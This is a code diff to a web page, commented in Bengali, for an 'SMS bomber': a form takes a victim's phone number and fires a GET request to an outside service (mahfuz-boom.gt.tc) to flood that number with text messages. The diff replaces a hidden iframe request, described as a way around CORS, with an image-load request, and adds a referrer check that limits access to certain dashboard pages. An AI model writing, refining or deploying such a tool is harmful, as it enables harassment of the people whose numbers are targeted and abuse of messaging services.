@@ -104,7 +104,7 @@
   <script>
     (function() {
       const referrer = document.referrer;
-      // ড্যাশবোর্ডের ফাইলেসগুলো এখানে উল্লেখ করুন
+      // ড্যাশবোর্ডের ফাইলগুলো এখানে উল্লেখ করুন
       const allowedReferrers = ['dashboard.html', 'special_dashboard.html']; 
 
       let isAllowed = false;
@@ -146,12 +146,13 @@
   </div>
 
   <script>
+    // এই ফাংশনটি API কল করবে এবং স্ট্যাটাস আপডেট করবে
     function triggerSMSBoom() {
         const numberInput = document.getElementById('targetNumber');
         const statusDiv = document.getElementById('status');
         const number = numberInput.value.trim();
         
-        // ১. ভ্যালিডেশন
+        // ১. ইনপুট ভ্যালিডেশন
         if (!number || number.length < 10) {
             statusDiv.textContent = 'দয়া করে সঠিক নম্বর দিন!';
             statusDiv.style.color = '#ff0055'; 
@@ -160,45 +161,40 @@
         }
 
         // ২. API URL
+        // API URL: http://mahfuz-boom.gt.tc/?number=017*******&cycles=3
         const apiUrl = `http://mahfuz-boom.gt.tc/?number=${number}&cycles=3`;
         
+        // স্ট্যাটাস আপডেট
         statusDiv.textContent = 'SMS B00M শুরু হচ্ছে...';
         statusDiv.style.color = '#00eaff';
         statusDiv.style.textShadow = '0 0 8px #00eaff';
 
-        // ৩. Invisible Iframe ব্যবহার করে API কল করা 
-        // এই পদ্ধতি CORS সমস্যা এড়িয়ে যায়।
+        // ৩. ইমেজ লোডিং পদ্ধতি ব্যবহার করে API কল
+        // এটি GET অনুরোধ পাঠানোর সবচেয়ে নির্ভরযোগ্য ক্লায়েন্ট-সাইড পদ্ধতি।
 
-        // পুরাতন Iframe মুছে নতুন Iframe তৈরি করা
-        const oldIframe = document.getElementById('api-iframe');
-        if (oldIframe) {
-            oldIframe.remove();
-        }
-
-        const iframe = document.createElement('iframe');
-        iframe.id = 'api-iframe';
-        iframe.style.display = 'none'; // অদৃশ্য রাখা
-        iframe.src = apiUrl;
+        const apiCallImage = new Image();
         
-        document.body.appendChild(iframe);
+        // যখন কলটি সম্পূর্ণ হবে (সফল বা ব্যর্থ), স্ট্যাটাস আপডেট হবে
+        apiCallImage.onload = apiCallImage.onerror = function() {
+            // API-এর রেসপন্স পাওয়া গেলে (অর্থাৎ কলটি শুরু হয়েছে)
+            statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
+            statusDiv.style.color = '#00ffaa'; 
+            statusDiv.style.textShadow = '0 0 8px #00ffaa';
+        };
 
-        // ৪. নিশ্চিতকরণের জন্য টাইমআউট
-        // API কলটি শুরু হয়েছে তা নিশ্চিত করতে ২.৫ সেকেন্ড অপেক্ষা করা।
+        // ৪. কলটি শুরু করা
+        apiCallImage.src = apiUrl;
+        
+        // ৫. ফলব্যাক টাইমআউট (যদি API সার্ভারটি কোনো প্রতিক্রিয়া না পাঠায়)
         setTimeout(() => {
-            // যদি স্ট্যাটাস "শুরু হচ্ছে..." থাকে, তবে সফল বার্তা দেখাও
             if (statusDiv.textContent === 'SMS B00M শুরু হচ্ছে...') {
-                statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
-                statusDiv.style.color = '#00ffaa'; 
-                statusDiv.style.textShadow = '0 0 8px #00ffaa';
+                // এটি একটি নিশ্চিত বার্তা
+                statusDiv.textContent = `সফলতার বার্তা দেখানো হলো। API কল শুরু করার চেষ্টা হয়েছে।`;
+                statusDiv.style.color = '#ffcc00'; // হলুদ নিয়ন
+                statusDiv.style.textShadow = '0 0 8px #ffcc00';
             }
-            
-            // Iframe-টি ডম থেকে মুছে ফেলা
-            const iframeToRemove = document.getElementById('api-iframe');
-            if (iframeToRemove) {
-                 iframeToRemove.remove();
-            }
+        }, 3000); // ৩ সেকেন্ড অপেক্ষা করা
 
-        }, 2500); // ২.৫ সেকেন্ড অপেক্ষা করা
     }
   </script>
 </body>
